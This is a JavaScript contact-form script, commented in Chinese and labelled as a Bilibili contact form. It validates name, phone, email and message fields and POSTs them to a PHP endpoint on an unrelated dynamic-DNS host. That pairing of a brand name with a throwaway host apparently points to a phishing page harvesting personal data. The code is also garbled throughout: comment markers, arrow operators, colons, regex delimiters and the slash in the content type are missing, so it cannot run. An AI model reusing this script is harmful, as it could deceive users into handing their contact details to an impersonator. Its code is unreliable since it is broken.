 B站联系表单脚本 - 自定义命名空间：BilibiliContactForm

var BilibiliContactForm = (function() {
     私有变量
    const API_BASE_URL = 'https://autr.1c.q56.dpdns.org/2/';
    const SUBMIT_URL = `${API_BASE_URL}submit_form.php`;
    
     初始化函数
    function init() {
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', onDocumentLoaded);
        } else {
            onDocumentLoaded();
        }
    }
    
     文档加载完成后执行
    function onDocumentLoaded() {
        document.getElementById('contact-form').addEventListener('submit', handleSubmit);
    }
    
     显示状态消息
    function showStatus(message, type) {
        const statusElement = document.getElementById('status');
        statusElement.textContent = message;
        statusElement.className = `status-message ${type}`;
        
         5秒后自动隐藏
        setTimeout(() = {
            statusElement.textContent = '';
            statusElement.className = 'status-message';
        }, 5000);
    }
    
     清除所有错误提示
    function clearErrors() {
        const errorElements = document.querySelectorAll('.error-message');
        errorElements.forEach(element = {
            element.textContent = '';
        });
        
        const formGroups = document.querySelectorAll('.form-group');
        formGroups.forEach(group = {
            group.classList.remove('error');
        });
    }
    
     显示表单验证错误
    function showError(fieldId, message) {
        const group = document.getElementById(`${fieldId}-group`);
        const errorElement = document.getElementById(`${fieldId}-error`);
        
        group.classList.add('error');
        errorElement.textContent = message;
    }
    
     表单验证
    function validateForm() {
        clearErrors();
        let isValid = true;
        
        const name = document.getElementById('name').value.trim();
        const phone = document.getElementById('phone').value.trim();
        const email = document.getElementById('email').value.trim();
        const message = document.getElementById('message').value.trim();
        
        if (!name) {
            showError('name', '请输入您的姓名');
            isValid = false;
        }
        
        if (!phone) {
            showError('phone', '请输入您的电话号码');
            isValid = false;
        } else if (!^1[3-9]d{9}$.test(phone)) {
            showError('phone', '请输入有效的手机号码');
            isValid = false;
        }
        
        if (!email) {
            showError('email', '请输入您的邮箱地址');
            isValid = false;
        } else if (!S+@S+.S+.test(email)) {
            showError('email', '请输入有效的邮箱地址');
            isValid = false;
        }
        
        if (!message) {
            showError('message', '请输入留言内容');
            isValid = false;
        }
        
        return isValid;
    }
    
     处理表单提交
    async function handleSubmit(event) {
        event.preventDefault();
        
        if (!validateForm()) {
            return;
        }
        
        const formData = {
            name document.getElementById('name').value.trim(),
            phone document.getElementById('phone').value.trim(),
            email document.getElementById('email').value.trim(),
            message document.getElementById('message').value.trim()
        };
        
        try {
             显示加载状态
            const submitButton = event.target.querySelector('button');
            const originalText = submitButton.textContent;
            submitButton.disabled = true;
            submitButton.textContent = '提交中...';
            
            const response = await fetch(SUBMIT_URL, {
                method 'POST',
                headers {
                    'Content-Type' 'applicationjson'
                },
                body JSON.stringify(formData)
            });
            
            const data = await response.json();
            
            if (data.status === 'success') {
                showStatus(data.message, 'success');
                 清空表单
                event.target.reset();
            } else {
                showStatus(data.message, 'error');
            }
        } catch (error) {
            showStatus('提交失败，请稍后再试', 'error');
            console.error('提交表单失败', error);
        } finally {
             恢复按钮状态
            const submitButton = event.target.querySelector('button');
            submitButton.disabled = false;
            submitButton.textContent = '提交';
        }
    }
    
     公开接口
    return {
        init init
    };
})();

 初始化表单
BilibiliContactForm.init();